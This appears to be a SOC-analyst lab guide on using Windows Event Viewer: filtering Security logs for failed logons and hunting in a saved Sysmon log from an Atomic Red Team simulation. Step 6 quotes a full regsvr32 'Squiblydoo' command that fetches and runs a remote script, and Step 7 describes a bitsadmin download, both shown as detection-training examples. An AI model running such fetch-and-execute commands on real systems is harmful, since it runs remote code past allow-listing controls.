![image](/FilesForLabs/images/blueantisyphon.png)

---

# Windows Event Viewer
#### Please use the Windows VM

<hr>

## Lab Objective
**Windows Event Viewer** is a built-in Windows tool for reading the logs that Windows and its programs write: logons, services starting and stopping, errors, and much more.

In this lab, we will be using **Event Viewer** to filter the **Security** log for failed logons. Then, we will open a saved **Sysmon** log and track down an attacker abusing a built-in Windows program.

The file for this lab is located in:

```
C:\Users\Administrator\Desktop\Labs\Win Event Viewer
```

<hr>

## Step 1: Opening Event Viewer
Let's get started by clicking the **Start Menu** and searching for **Event Viewer**.

<img width="784" height="684" alt="Start Menu search results showing Event Viewer" src="https://github.com/user-attachments/assets/9565a313-6199-40d1-8d35-accebc217f94" />

>[!TIP]
>Search can take a few seconds to show results on the lab VM.

You can also open it through the **Run** dialog. Press **Windows key + R**, then enter:

```
eventvwr.msc
```

<img width="405" height="225" alt="Run dialog with eventvwr.msc entered" src="https://github.com/user-attachments/assets/db042d24-6818-479f-be11-8452ee889a54" />

Once it opens, **maximize** the window. You will want the extra room to read events.

<hr>

## Step 2: Exploring The Windows Logs
On the left-hand side, expand **Windows Logs**. These are the main logs Windows keeps:

- **Application** - Events from programs like SQL Server, Outlook, etc.
- **Security** - Audit events like logons, logoffs, and file access.
- **Setup** - Events from Windows setup and updates.
- **System** - Events from Windows components like drivers and services.
- **Forwarded Events** - Events collected from other computers.

<img width="1507" height="995" alt="Event Viewer with Windows Logs expanded" src="https://github.com/user-attachments/assets/13d8e7d2-9674-4f82-acd3-66e552674e8f" />

Every event has an **Event ID**. This is a number that tells you what kind of event it is. Here are a few worth remembering:

- **4624** - Successful logon
- **4625** - Failed logon attempt
- **6005** - Event log service started (system startup)
- **6006** - Event log service stopped (system shutdown)

<hr>

## Step 3: Filtering For Failed Logons
Click on the **Security** log.

The Security log on this VM has tens of thousands of events. Scrolling through them is not an option, so let's filter.

>[!IMPORTANT]
>Always left-click a log to select it first. If you right-click a log that is not selected, **Filter Current Log...** and **Find...** will be greyed out.

Right-click **Security** and select **Filter Current Log...**

>[!WARNING]
>**Clear Log...** sits right above **Filter Current Log...** in that menu. Clicking it wipes the entire log, so take your time here.

Click in the box that says **&lt;All Event IDs&gt;** and enter:

```
4625
```

Then click **OK**.

Now you will only see **Audit Failure** events. Click on one and read the **General** tab below the list.

Look at **Account For Which Logon Failed**. Which account is being targeted?

On our VM, it was the **Administrator** account. Lots of failed logons against one account is exactly what a password guessing attack looks like.

When you are done, click **Clear Filter** in the **Actions** pane on the right.

<hr>

## Step 4: Opening The Sysmon Log
**Sysmon** (System Monitor) is a free Microsoft tool that logs very detailed activity, like every program that starts and every network connection it makes. Many SOCs rely on it.

The log we are about to open was recorded while an attack simulation (**Atomic Red Team**) ran on a test machine.

In the **Actions** pane on the right, click **Open Saved Log...**

Browse to the following file and click **Open**:

```
C:\Users\Administrator\Desktop\Labs\Win Event Viewer\sysmon.evtx
```

A second **Open Saved Log** window will pop up. Leave everything as it is and click **OK**.

The log will appear on the left under **Saved Logs**, with **565** events.

>[!NOTE]
>Every event will say **"The description for Event ID ... cannot be found."** This is expected! Sysmon is not installed on this VM, so Windows does not know how to word the message. All of the data is still there.

To read the data cleanly, click an event, then click the **Details** tab and make sure **Friendly View** is selected.

Sysmon uses its own Event IDs. These are the ones we care about:

- **1** - Process created (a program started)
- **3** - Network connection
- **7** - Image loaded (a program loaded a DLL)
- **11** - File created
- **13** - Registry value set

<hr>

## Step 5: Hunting For Suspicious Network Connections
Click on **sysmon** under **Saved Logs**, then right-click it and select **Filter Current Log...**

>[!TIP]
>Filtering a saved log can take 10-20 seconds to open on the lab VM. Be patient!

In the **&lt;All Event IDs&gt;** box, enter:

```
3
```

Then click **OK**.

You should see **4** network connection events. Click on each one and look at the **Details** tab. Pay attention to these fields:

- **Image** - The program that made the connection.
- **DestinationIp** and **DestinationPort** - Where it connected to.

Three of the connections came from **powershell.exe**. A favorite of attackers, so that alone is worth noting.

But one of them is far stranger: **regsvr32.exe** connecting to **151.101.0.133** on port **443**.

Why is that weird? **regsvr32.exe** is a built-in Windows program for registering DLLs. It has no business reaching out to the internet.

Sysmon thought so too. Look at the **RuleName** field: **Suspicious NetCon**.

Also, write down the **ProcessId** of that event: **2076**. We will use it in the next step.

When you are done, click **Clear Filter** in the **Actions** pane.

<hr>

## Step 6: Finding What regsvr32 Ran
Let's find out exactly how **regsvr32.exe** was used.

First, scroll to the very top of the event list and click the **first event**.

>[!IMPORTANT]
>**Find** only searches from the selected event downward. If you start in the middle of the log, it can miss what you are looking for.

Click **Find...** in the **Actions** pane and enter:

```
regsvr32
```

Click **Find Next**. Keep clicking **Find Next** and watching the event details until you find the event (Event ID **1**, ProcessId **2076**) with this command line:

```
regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
```

It takes about **7** clicks.

So, what is going on here? **regsvr32.exe** downloaded a script file (**.sct**) straight from the internet and ran it using **scrobj.dll**. Nothing was written to disk first.

This technique is known as **"Squiblydoo."** Attackers love it because **regsvr32.exe** is a signed Microsoft program, so many application allow-listing tools let it run. It is tracked in **MITRE ATT&CK** as **T1218.010** (Regsvr32).

Along the way, you probably also passed a **calc.exe** event. That is the script's payload. Atomic Red Team pops a calculator to prove code ran. A real attacker would run something far worse.

<hr>

## Step 7: On Your Own
Using what you just learned, search the sysmon log for:

```
bitsadmin
```

**bitsadmin.exe** is another built-in Windows program, used to download files in the background.

Can you answer these questions?

- What file did **bitsadmin** download?
- Where on the system did it save it?

>[!TIP]
>Remember to click the first event before you start your search.

You should find that it downloaded **T1197.md** from GitHub and saved it as **C:\Windows\Temp\bitsadmin_flag.ps1**. Saving a downloaded file with a **.ps1** (PowerShell script) name is a big red flag.

<hr>

## Other Things You Can Do With Event Viewer
- **Custom Views** - Save a filter so you can reuse it later.
- **Event Subscriptions** - Collect events from other computers using Event Forwarding (requires setup through Group Policy).
- **Export Logs** - Right-click a log and choose **Save All Events As...** to save it as .evtx, .xml, .txt, or .csv.
- **Attach a Task** - Right-click an event and choose **Attach Task To This Event...** to run a program when that event happens again.

---
[Back to the Section](/SocAnalystLabs/courseFiles/Section_01-logAnalysis_Basics/logAnalysis_basics.md)


> Created By Turcu Știolică Alexandru - Black Hills Information Security
